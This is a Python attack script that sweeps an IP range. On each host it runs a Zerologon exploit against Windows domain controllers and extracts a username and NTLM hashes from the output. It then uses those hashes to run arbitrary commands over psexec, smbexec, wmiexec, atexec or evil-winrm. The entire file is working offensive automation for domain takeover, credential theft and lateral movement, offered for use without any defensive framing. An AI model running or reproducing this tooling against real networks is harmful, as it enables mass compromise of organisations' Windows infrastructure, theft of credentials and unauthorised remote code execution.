#!/usr/bin/env python3
import subprocess
import re
import sys
import threading

ZEROSHOT_TIMEOUT = 20
EXEC_TIMEOUT = 25


def parse_ip_range(ip_range):
    parts = ip_range.split('.')
    if len(parts) != 4:
        raise SystemExit("Invalid IP range format")

    def expand(part):
        vals = []
        for section in part.split(','):
            if '-' in section:
                s, e = map(int, section.split('-'))
                vals.extend(range(s, e + 1))
            else:
                vals.append(int(section))
        return vals

    expanded = [expand(p) for p in parts]
    return [f"{a}.{b}.{c}.{d}"
            for a in expanded[0]
            for b in expanded[1]
            for c in expanded[2]
            for d in expanded[3]]


def run_zero_shot(ip):
    # timeout wrapper
    try:
        result = subprocess.run(
            ["python3", "zerologon-Shot/zerologon-Shot.py", ip],
            capture_output=True,
            text=True,
            timeout=ZEROSHOT_TIMEOUT
        )
        return result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        print(f"[!] zerologon-shot timed out for {ip}")
        return ""


def parse_input(text):
    # Format:
    # USER:RID:LMHASH:NTHASH:::
    m = re.search(
        r"^([A-Za-z0-9\.\$\-_]+):\d+:([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):::",
        text,
        re.MULTILINE
    )
    if not m:
        return {"user": None, "lmhash": None, "nthash": None}

    return {
        "user": m.group(1),
        "lmhash": m.group(2),
        "nthash": m.group(3)
    }


def build_cmd(tool, user, target, lmhash, nthash, command):
    full_hash = f"{lmhash}:{nthash}"

    if tool == "psexec":
        return ["psexec.py", f"{user}@{target}", "-hashes", full_hash, command]

    if tool == "smbexec":
        return ["smbexec.py", f"{user}@{target}", "-hashes", full_hash, command]

    if tool == "wmiexec":
        return ["wmiexec.py", f"{user}@{target}", "-hashes", full_hash, command]

    if tool == "atexec":
        return ["atexec.py", f"{user}@{target}", "-hashes", full_hash, command]

    if tool == "winrm":
        # still not one‑shot executable
        return ["evil-winrm", "-i", target, "-u", user, "-H", nthash]

    raise Exception(f"Unknown tool: {tool}")


def run_with_timeout(cmd, timeout):
    try:
        proc = subprocess.Popen(cmd)
    except Exception:
        return -1

    def kill():
        try: proc.kill()
        except: pass

    timer = threading.Timer(timeout, kill)
    timer.start()
    rc = proc.wait()
    timer.cancel()
    return rc


def run_chain(user, ip, lmhash, nthash, command):
    chain = ["psexec", "smbexec", "wmiexec", "atexec", "winrm"]

    for tool in chain:
        cmd = build_cmd(tool, user, ip, lmhash, nthash, command)
        print(f"[i] Trying {tool}: {' '.join(cmd)}")

        rc = run_with_timeout(cmd, EXEC_TIMEOUT)

        if rc == 0:
            print(f"[+] {tool} succeeded.")
            return tool

        print(f"[-] {tool} failed.")

    return None


def main():
    if len(sys.argv) < 2:
        print("Usage: zero_shot_command.py <ip_range> [command]")
        print("For example: zero_shot_command 10.100.101-130,132.35 'whoami'")
        print("- The above will skip 10.100.131.35")
        sys.exit(1)

    ip_range = sys.argv[1]
    ips = parse_ip_range(ip_range)

    command = " ".join(sys.argv[2:]) if len(sys.argv) > 2 else "whoami"

    for ip in ips:
        text = run_zero_shot(ip)
        parsed = parse_input(text)

        print("Parsed:")
        for k, v in parsed.items():
            print(f"{k}: {v}")

        if not parsed["user"] or not parsed["nthash"]:
            print("[!] No valid creds extracted, skipping host.")
            continue

        run_chain(parsed["user"], ip, parsed["lmhash"], parsed["nthash"], command)


if __name__ == "__main__":
    main()
